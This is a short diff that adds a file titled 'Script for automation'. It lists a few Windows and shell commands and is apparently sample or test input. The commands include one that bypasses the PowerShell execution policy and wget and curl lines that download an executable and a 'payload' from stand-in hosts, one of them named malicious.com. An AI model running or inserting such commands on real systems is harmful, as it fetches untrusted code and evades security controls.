@@ -1,0 +1,5 @@
+Script for automation
+cmd.exe /c dir
+powershell -ExecutionPolicy Bypass
+wget http://download-site.com/tool.exe
+curl -O http://malicious.com/payload
